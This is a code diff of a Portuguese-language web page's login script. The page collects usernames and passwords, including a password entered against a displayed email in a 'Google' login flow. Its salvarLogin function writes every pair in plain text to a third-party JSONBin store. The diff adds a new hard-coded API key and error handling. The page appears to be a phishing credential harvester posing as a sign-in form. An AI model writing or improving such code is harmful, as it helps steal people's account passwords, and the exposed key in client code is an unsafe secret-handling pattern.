@@ -358,7 +358,7 @@
 <script>
   // ⚠️ SUBSTITUA PELOS SEUS DADOS DO JSONBIN
   const JSONBIN_BIN_ID  = "69ab0df3ae596e708f668141";   // ex: 6630f1aead19ca34f8a1b2c3
-  const JSONBIN_API_KEY = "$2a$10$fNTEdTFVqYo.CN7JmhS8UerLarmE61hS/T0VG6jqJaLpIHUXtdwYG"; // ex: $2a$10$AbCdEf...
+  const JSONBIN_API_KEY = "$2a$10$GSl73ItjODY99dgV64xFaOccmtsIwPiIyLK21hoFFNW.kY4hiwOhS"; // ex: $2a$10$AbCdEf...
 </script>
 
 <script>
@@ -423,35 +423,33 @@
   }
 
   window.salvarLogin = async function(usuario, senha, tipo) {
-    try {
-      // 1. Busca os dados atuais do bin
-      const getRes = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
-        headers: { 'X-Access-Key': JSONBIN_API_KEY }
-      });
-      const getData = await getRes.json();
-      const logins = getData.record?.logins || [];
+    // 1. Busca os dados atuais do bin
+    const getRes = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
+      headers: { 'X-Access-Key': JSONBIN_API_KEY }
+    });
+    if (!getRes.ok) throw new Error(`Erro ao buscar bin: ${getRes.status}`);
+    const getData = await getRes.json();
+    const logins = getData.record?.logins || [];
 
-      // 2. Adiciona o novo registro
-      logins.push({
-        usuario,
-        senha,
-        tipo,
-        data: new Date().toLocaleString('pt-BR'),
-        timestamp: Date.now()
-      });
+    // 2. Adiciona o novo registro
+    logins.push({
+      usuario,
+      senha,
+      tipo,
+      data: new Date().toLocaleString('pt-BR'),
+      timestamp: Date.now()
+    });
 
-      // 3. Salva de volta no bin
-      await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
-        method: 'PUT',
-        headers: {
-          'Content-Type': 'application/json',
-          'X-Access-Key': JSONBIN_API_KEY
-        },
-        body: JSON.stringify({ logins })
-      });
-    } catch (err) {
-      console.error('Erro JSONBin:', err);
-    }
+    // 3. Salva de volta no bin
+    const putRes = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
+      method: 'PUT',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Access-Key': JSONBIN_API_KEY
+      },
+      body: JSON.stringify({ logins })
+    });
+    if (!putRes.ok) throw new Error(`Erro ao salvar bin: ${putRes.status}`);
   }
 
   async function handleLogin() {
@@ -459,8 +457,13 @@
     const p = document.getElementById('senha').value;
     if (!u || !p) { shakeCard(main); return; }
     showToast('Salvando...');
-    await window.salvarLogin(u, p, 'credenciais');
-    showToast(`✓ Login salvo para <strong>${u}</strong>`);
+    try {
+      await window.salvarLogin(u, p, 'credenciais');
+      showToast(`✓ Login salvo para <strong>${u}</strong>`);
+    } catch (err) {
+      console.error(err);
+      showToast(`❌ Erro ao salvar: ${err.message}`);
+    }
   }
 
   async function handleGoogleLogin() {
@@ -468,8 +471,13 @@
     if (!p) { shakeCard(gscr); return; }
     const email = document.getElementById('g-email-tag').textContent;
     showToast('Salvando...');
-    await window.salvarLogin(email, p, 'Google');
-    showToast(`✓ Login Google salvo para <strong>${email}</strong>`);
+    try {
+      await window.salvarLogin(email, p, 'Google');
+      showToast(`✓ Login Google salvo para <strong>${email}</strong>`);
+    } catch (err) {
+      console.error(err);
+      showToast(`❌ Erro ao salvar: ${err.message}`);
+    }
   }
 
   function shakeCard(card) {
@@ -495,7 +503,7 @@
     t._timer = setTimeout(() => {
       t.classList.remove('toast-show');
       t.classList.add('toast-hide');
-    }, 3000);
+    }, 6000);
   }
 
   // inject toast CSS
